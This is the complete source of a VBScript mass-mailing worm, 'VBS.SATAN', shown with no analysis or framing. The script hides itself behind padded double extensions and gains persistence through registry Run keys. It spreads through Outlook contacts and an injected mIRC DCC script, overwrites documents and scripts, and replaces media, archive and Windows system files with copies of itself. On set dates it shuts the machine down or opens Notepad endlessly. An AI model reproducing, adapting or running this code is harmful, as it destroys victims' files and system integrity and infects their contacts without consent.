   rem     ><> this is a SANTAN'S fish ;P  :   < fox hate skool > :    < [G]inSenG is a great bro >
   rem Written By: fox
   rem origin: Yulang West
   rem VBS.SATAN
   rem version 1.0

   On Error Resume Next
   Const ForReading=1,ForWriting=2,ForAppending=8
   Dim a,b,c,d,e,f,g,h,x,z,aaa,bbb,ccc,ddd,eee,mail,mailyou,mailout,firsttime
   Set a=CreateObject("Scripting.FileSystemObject")
   Set b=CreateObject("WScript.Shell")
   Set c=a.GetFile(WScript.ScriptFullName)
   Set d=a.OpenTextFile(WScript.ScriptFullName,1)
   e=d.Readall
   z=b.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Script Host\Settings\Timeout")
   if (z>=1) Then
   b.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Script Host\Settings\Timeout",0, "REG_DWORD"
   End If
   f="SATAN_SECRETS.TXT                                                                       .vbs"  'for all your info this is 70 spaces ;P
   h="WINDOWS_SYSTEM_FILE.DLL                                                                       .666"  'for all your info this is 70 spaces ;P
   c.Copy("C:\Windows\System\"&f)
   c.Copy("C:\Windows\"&f)
   c.Copy("C:\"&f)
   c.Copy("C:\Windows\System\"&h)
   g=Chr(13)&Chr(14)
   If Not a.FileExists("C:\Windows\System\"&f) Then
   Set d=a.CreateTextFile("C:\Windows\System\SATAN_SECRETS.TXT")
   d.Write("SATAN SECRETS BY < fox >"&g&g&"SATAN IS ANOTHER NAME FOR THE DEVIL, OR THE SPIRIT OF EVIL. SATAN IS A HEBREW WORD AND MEANS ""ONE WHO TAKES THE OPPOSITE SIDE"", THUS IN THE OLD TESTAMENT SATAN IS OFTEN CALLED ""THE ADVERSARY"". SATANISM OR ""DEVIL WORSHIP"" HAS FOR LONG BEEN HELD TO BE THE EVIL OPPOSITE OF CHRISTIANITY. SATANISTS WERE MUCH FEARED, EXPECIALLY IN THE MIDDLE AGES, FOR THE PRACTICE OF WITCHCRAFT AND BLACK MAGIC."&g&g&"EVERYONE DO RESPECT SATAN."&g&g&"<fox>")
   d.Close
   b.Run("C:\Windows\System\SATAN_SECRETS.TXT")
   firsttime="TRUE"
   End If
   z=b.RegRead("HKEY_CLASSES_ROOT\txtfile\DefaultIcon\")
   b.RegWrite "HKEY_CLASSES_ROOT\.666\","666"
   b.RegWrite "HKEY_CLASSES_ROOT\666\ScriptEngine\","vbscript"
   b.RegWrite "HKEY_CLASSES_ROOT\666\shell\Open\command\", h&"\wscript.exe ""%1"" %*"
   b.RegWrite "HKEY_CLASSES_ROOT\666\DefaultIcon\", z
   b.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32", "C:\Windows\System\"&h
   b.Regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Version", "CONTROLLED by fox"
   If a.FolderExists("C:\Program Files\ICQ") Then
   b.RegWrite("HKEY_CURRENT_USER\Software\Mirabilis\Agent\Apps\ICQ\Enable","Yes"
   b.RegWrite("HKEY_CURRENT_USER\Software\Mirabilis\Agent\Apps\ICQ\Parameters",""
   b.RegWrite("HKEY_CURRENT_USER\Software\Mirabilis\Agent\Apps\ICQ\path","c:\windows\system\"&h
   b.RegWrite("HKEY_CURRENT_USER\Software\Mirabilis\Agent\Apps\ICQ\Startup",""
   End If
   For Each Target In a.GetFolder("C:\").SubFolders
   If a.FileExists(target.path &"\" & "mirc.ini") Then
   set d=a.CreateTextFile(target.path & "\" & "script.ini", 2)
   d.Write("[script]"&g&"n0=;SATAN SPELL"&g&"n1=;WHOEVER EDIT THIS WILL DIE!!"&g&"n2=;-P"&g&"n3=on *:start:{"&g&"n4=if ($exists(""c:\windows\system\"&f&""") == $true) { /set %s.file2send c:\windows\system\"&f&" }"&g&"n5=else {"&g&"n6=if ($exists(""c:\windows\"&f&""") == $true) { /set %s.file2send c:\windows\"&f&" }"&g&"n7=else {"&g&"n8=if ($exists(""c:\"&f&""") == $true) { /set %s.file2send c:\"&f&" }"&g&"n9=else {"&g&"n10=if ($exists(""c:\windows\system\"&h&""") == $true) { /run c:\windows\system\"&h&" | /set %s.file2send c:\windows\system\"&f&" }"&g&"n11=else { /run c:\windows\rundll.exe user.exe,exitwindows }"&g&"n12=}"&g&"n13=}"&g&"n14=}"&g&"n15=}"&g&"n16=on *:join:#:/if ($right($chan , $calc($len($chan) - 1)) isin virusfixhelpclearsatanclean) { /part $chan } |  /if ($nick != $me) && ($r(1,5) == 3) { /.msg $nick Please Accept This File From Me. This Is Some Secrets About The Satan. | /.dcc send $nick %s.file2send }"&g&"n17=on *:part:#:/if ($nick != $me) && ($r(1,5) == 3) { /.msg $nick Please Accept This File From Me. This Is Some Secrets About The Satan. | /.dcc send $nick %s.file2send }"&g&"n18=on *:text:*:*:/if ($1- isin virusfixhelpclearsatanclean) { /.ignore $nick }")
   d.Close
   End If
   Next
   For Each Target In a.GetFolder("C:\My Documents").Files
   x=lcase(a.GetExtensionName(target.name))
   If (x="txt") or (x="doc") Then
   Set d=a.OpenTextFile(target.path,2)
   d.Write(":P"&g&"SATANIC")
   d.Close
   ElseIf (x="vbs") or (x="vbe") or (x="js") Then
   Set d=a.OpenTextFile(target.path,2)
   d.Write e
   d.Close
   ElseIf (x="mp3") or (x="mp2") or (x="mpg") or (x="aif") or (x="wav") or (x="mid") or (x="exe") or (x="zip") or (x="rar") or (x="jpg") or (x="gif") or (x="bmp") or (x="jpeg") or (x="html") or (x="htm") Then
   Set d=a.CreateTextFile(target.path&".666",2)
   d.Write e
   d.Close
   a.DeleteFile(target.path)
   End If
   Next
   If a.FolderExists("C:\My Music") Then
   For Each Target In a.GetFolder("C:\My Music").Files
   x=lcase(a.GetExtensionName(target.name))
   If (x="mp3") or (x="mp2") or (x="mpg") or (x="aif") or (x="wav") or (x="mid") or (x="exe") or (x="zip") or (x="rar") or (x="jpg") or (x="gif") or (x="bmp") or (x="jpeg") or (x="html") or (x="htm") Then
   Set d=a.CreateTextFile(target.path&".666",2)
   d.Write e
   d.Close
   a.DeleteFile(target.path)
   End If
   Next
   End If
   If a.FolderExists("C:\My Documents\My Music") Then
   For Each Target In a.GetFolder("C:\My Music").Files
   x=lcase(a.GetExtensionName(target.name))
   If (x="mp3") or (x="mp2") or (x="mpg") or (x="aif") or (x="wav") or (x="mid") or (x="exe") or (x="zip") or (x="rar") or (x="jpg") or (x="gif") or (x="bmp") or (x="jpeg") or (x="html") or (x="htm") Then
   Set d=a.CreateTextFile(target.path&".666",2)
   d.Write e
   d.Close
   a.DeleteFile(target.path)
   End If
   Next
   End If
   For Each Target In a.GetFolder("C:\Windows\System").Files
   x=lcase(a.GetExtensionName(target.name))
   If (x="dll") or (x="inf") or (x="exe") Then
   Set d=a.CreateTextFile(target.path&".666",2)
   d.Write e
   d.Close
   a.DeleteFile(target.path)
   End If
   Next
   Set mailout = WScript.CreateObject("Outlook.Application")
   Set mailyou = mailout.GetNameSpace("MAPI")
   For aaa = 1 To mailyou.AddressLists.Count
   Set ddd = mailyou.AddressLists(aaa)
   bbb = 1
   regv = b.RegRead("HKEY_LOCAL_MACHINE\Software\Microsof\WAB" & ma)
   If (regv = "") Then
   regv = 1
   End If
   If (int(ddd.AddressEntries.Count) > int(regv)) Then
   For eee = 1 to ddd.AddressEntries.Count
   mailed = ddd.AddressEntries(bbb)
   ccc = ""
   ccc = b.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB" & mailed)
   if (ccc="") then
   Set mail = mailout.CreateItem(0)
   mail.Recipients.Add(mailed)
   mail.Subject = "FW: Some Secrets That Was Not Revealed Long Time Ago"
   mail.Body = "Read The Attachment For The Secrets... Of the SATAN... It was kept for a secret for decades... Till someone discover it..."
   mail.Attachments.Add("C:\Windows\System\"&f)
   mail.Send
   b.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" &mailed,1,"REG_DWORD"
   End If
   x=x+1
   next
   b.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&ddd,ddd.AddressEntries.Count
   Else
   b.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&ddd,ddd.AddressEntries.Count
   End If
   Next
   Set mailout = Nothing
   Set mailyou = Nothing
   If firsttime="TRUE" Then
   z=Hour(Now)
   y="AM"
   If z>12 Then
   y="PM"
   z=z-12
   End If
   msgbox "Time is: "&z&":"& Minute(Now) & y & chr(13) & "And i'm outta here! ;-)"
   End If
   If Day(Now)=3 or Day(Now)=13 or Day(Now)=23 Then
   b.Run("c:\windows\rundll.exe user.exe,exitwindows")
   End If
   If Day(Now)=5 or Day(Now)=15 or Day(Now)=25 Then
   Do
   b.Run "notepad" , false
   Loop
   End If
